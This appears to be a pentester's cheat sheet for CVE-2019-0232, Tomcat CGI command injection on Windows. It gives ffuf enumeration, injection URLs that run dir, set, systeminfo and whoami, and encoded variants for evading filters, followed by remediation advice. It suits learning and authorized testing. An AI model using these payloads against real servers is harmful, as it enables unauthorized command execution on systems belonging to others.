

# Apache Tomcat CGI - Remote Code Execution (CVE-2019-0232)

## 🧠 Overview

Although Apache Tomcat is primarily a Java-based server, it includes a **CGI Servlet** to run external scripts. On **Windows** systems, this servlet was found to be vulnerable to Command Injection because of how it passed arguments to the Windows command interpreter (`cmd.exe`).

➡️ **The Root Cause:** Insecure handling of command-line arguments when launching Windows batch files (`.bat` or `.cmd`).

---

## 🛠️ Requirements for Vulnerability

For a Tomcat instance to be vulnerable to CVE-2019-0232, specific (and non-default) configurations must be present in `web.xml`:

1. **CGI Servlet Enabled:** The `CGIServlet` must be uncommented.
2. **enableCmdLineArguments:** This parameter must be set to `true`.
3. **Executable Type:** The target script must be a Windows batch file (`.bat` or `.cmd`).

---

## 🔍 Enumeration & Discovery

### 🧪 Identifying the Attack Surface

First, we need to find if the `/cgi/` directory exists and contains any executable batch files.

```bash
# Fuzzing for common batch file names
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://TARGET:8080/cgi/FUZZ.bat -mc 200

```

### 🧪 Environment Reconnaissance

If you find a script but your commands don't seem to return output, the `PATH` might be empty. Use the `set` command to see the environment:

* **Payload:** `http://TARGET:8080/cgi/test.bat?&set`

---

## 🚀 Exploitation

### 1. Basic Injection

Since the parameters are passed to `cmd.exe`, we can use standard Windows command separators like `&`, `|`, or `&&`.

* **List Directory:** `http://TARGET:8080/cgi/test.bat?&dir`
* **System Info:** `http://TARGET:8080/cgi/test.bat?&systeminfo`

### 2. Bypassing PATH issues

If basic commands fail, use absolute paths to ensure the binary is executed:

* **Payload:** `http://TARGET:8080/cgi/test.bat?&c:\windows\system32\whoami.exe`

### 3. URL Encoding (WAF/Filter Bypass)

If the server returns a `403` or `400` error, encode the special characters:

* **Encodificado:** `?%26dir` o `?%26c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`

---

## 🛡️ Remediation

1. **Update Tomcat:** Versions 9.0.18+, 8.5.40+, and 7.0.94+ fixed this by introducing a stricter regex for command-line arguments.
2. **Configuration:** Set `enableCmdLineArguments` to `false` (default in newer versions).
3. **Permissions:** Ensure the user running the Tomcat service has the absolute minimum privileges on the OS.

---

## 💣 Pentester Mindset

* **The Windows Factor:** This vulnerability is specific to Windows because it relies on how `CreateProcess` and `cmd.exe` handle arguments.
* **Silent Failures:** If the script `test.bat` expects 2 arguments and you provide 3 via injection, the script might crash before your command runs. Try injecting at the end of the expected parameters.
* **Modern Tomcat:** On newer versions, you might see `enableCmdLineArguments` set to `true` but a `cmdLineArgumentsDecoded` regex protecting the input.

